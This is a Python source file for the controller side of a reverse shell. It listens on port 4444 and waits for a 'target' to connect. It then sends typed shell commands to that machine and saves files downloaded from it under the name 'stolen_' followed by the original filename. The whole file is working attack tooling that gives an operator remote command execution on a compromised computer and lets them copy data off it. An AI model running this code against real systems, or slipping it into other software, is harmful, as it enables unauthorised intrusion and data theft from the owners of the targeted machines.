import socket

def send_data(s, data):
    # Ensure data is bytes and send with a 16-byte header
    if isinstance(data, str): data = data.encode()
    header = f"{len(data):016d}".encode()
    s.sendall(header + data)

def recv_data(s):
    # First, read exactly 16 bytes to get the length
    header = s.recv(16).decode().strip()
    if not header: return b""
    
    total_size = int(header)
    data = b""
    while len(data) < total_size:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
    return data

def start_controller():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(1)
    print("[*] Listening on port 4444...")

    target, ip = server.accept()
    print(f"[*] Connected to {ip}")

    while True:
        command = input("Shell> ").strip()
        if not command: continue
        
        send_data(target, command)
        if command.lower() == "exit": break

        # Receive response
        result = recv_data(target)

        if command.startswith("download "):
            if result.startswith(b"Error"):
                print(result.decode())
            else:
                filename = "stolen_" + command.split()[-1]
                with open(filename, "wb") as f:
                    f.write(result)
                print(f"[+] Downloaded: {filename}")
        else:
            print(result.decode(errors="replace"))

    target.close()
    server.close()

if __name__ == "__main__":
    start_controller()